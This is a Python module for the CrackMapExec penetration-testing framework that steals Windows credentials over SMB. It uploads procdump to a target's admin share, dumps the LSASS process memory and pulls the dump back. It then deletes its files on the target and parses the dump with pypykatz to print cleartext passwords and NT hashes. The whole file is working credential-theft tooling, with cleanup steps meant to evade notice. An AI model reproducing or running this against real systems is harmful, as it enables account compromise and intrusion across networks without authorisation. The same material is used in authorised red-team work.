# prdocdump module for CME python3
# author: github.com/mpgn
# thanks to pixis (@HackAndDo) for making it pretty l33t :)
# v0.4

from io import StringIO
import os
import sys
import re
import time

class CMEModule:

    name = 'procdump'
    description = "Get lsass dump using procdump64 and parse the result with pypykatz"
    supported_protocols = ['smb']
    opsec_safe = True # not really
    multiple_hosts = True

    def options(self, context, module_options):
        '''
            TMP_DIR             Path where process dump should be saved on target system (default: C:\\Windows\\Temp\\)
            PROCDUMP_PATH       Path where procdump.exe is on your system (default: /tmp/shared/)
            PROCDUMP_EXE_NAME   Name of the procdump executable (default: procdump64.exe)
        '''

        self.tmp_dir = "C:\\Windows\\Temp\\"
        self.share = "C$"
        self.tmp_share = self.tmp_dir.split(":")[1]
        self.procdump = "procdump.exe"
        self.procdump_path = "/tmp/shared/"

        if 'PROCDUMP_PATH' in module_options:
            self.procdump_path = module_options['PROCDUMP_PATH']

        if 'PROCDUMP_EXE_NAME' in module_options:
            self.procdump = module_options['PROCDUMP_EXE_NAME']

        if 'TMP_DIR' in module_options:
            self.tmp_dir = module_options['TMP_DIR']

    def on_admin_login(self, context, connection):
    
        context.log.info('Copy {} to {}'.format(self.procdump_path + self.procdump, self.tmp_dir))
        with open(self.procdump_path + self.procdump, 'rb') as procdump:
            try:
                connection.conn.putFile(self.share, self.tmp_share + self.procdump, procdump.read)
                context.log.success('Created file {} on the \\\\{}{}'.format(self.procdump, self.share, self.tmp_share))
            except Exception as e:
              context.log.error('Error writing file to share {}: {}'.format(share, e))
    
        # get pid lsass
        command = 'tasklist /v /fo csv | findstr /i "lsass"'
        context.log.info('Getting lsass PID {}'.format(command))
        p = connection.execute(command, True)
        pid = p.split(',')[1][1:-1]
        command = self.tmp_dir + self.procdump + ' -accepteula -ma ' + pid + ' ' + self.tmp_dir + '%COMPUTERNAME%-%PROCESSOR_ARCHITECTURE%-%USERDOMAIN%.dmp'
        context.log.info('Executing command {}'.format(command))
        p = connection.execute(command, True)
        context.log.debug(p)
        dump = False
        if 'Dump 1 complete' in p:
            context.log.success('Process lsass.exe was successfully dumped')
            dump = True
        else:
            context.log.error('Process lsass.exe error un dump, try with verbose')
        
        if dump:
            regex = r"([A-Za-z0-9-]*.dmp)"
            matches = re.search(regex, str(p), re.MULTILINE)
            machine_name = ''
            if matches:
                machine_name = matches.group()
            else:
                context.log.info("Error getting the lsass.dmp file name")
                sys.exit(1)

            context.log.info('Copy {} to host'.format(machine_name))

            with open(self.procdump_path + machine_name, 'wb+') as dump_file:
                try:
                    connection.conn.getFile(self.share, self.tmp_share + machine_name, dump_file.write)
                    context.log.success('Dumpfile of lsass.exe was transferred to {}'.format(self.procdump_path + machine_name))
                except Exception as e:
                    context.log.error('Error while get file: {}'.format(e))

            try:
                connection.conn.deleteFile(self.share, self.tmp_share + self.procdump)
                context.log.success('Deleted procdump file on the {} share'.format(self.share))
            except Exception as e:
                context.log.error('Error deleting procdump file on share {}: {}'.format(self.share, e))
            
            try:
                connection.conn.deleteFile(self.share, self.tmp_share + machine_name)
                context.log.success('Deleted lsass.dmp file on the {} share'.format(self.share))
            except Exception as e:
                context.log.error('Error deleting lsass.dmp file on share {}: {}'.format(self.share, e))
            
            context.log.info("pypykatz lsa minidump {} > {}.txt".format(self.procdump_path + machine_name, self.procdump_path + machine_name))
            
            try:
                context.log.info('Invoke pypykatz in order to extract the credentials ...')
                os.system("pypykatz lsa minidump " + self.procdump_path + machine_name + " > " + self.procdump_path + machine_name + ".txt")
                context.log.info("Extracted credentials:")
                with open(self.procdump_path + machine_name + ".txt", 'r') as outfile:
                    data = outfile.read()
                    regex = r"(?:username:? (?!NA)(?P<username>.+[^\$])\n.*domain(?:name)?:? (?P<domain>.+)\n)(?:.*password:? (?!None)(?P<password>.+)|.*\n.*NT: (?P<hash>.*))"
                    matches = re.finditer(regex, data, re.MULTILINE | re.IGNORECASE)
                    for match in matches:
                        domain = match.group("domain")
                        username = match.group("username")
                        password = match.group("password") or match.group("hash")
                        context.log.success(highlight(domain + "\\" + username + ":" + password))
            except Exception as e:
                context.log.error('Error while execute pypykatz: {}'.format(e))
                context.log.error('Please make sure pypykatz is installed (pip3 install pypykatz)')
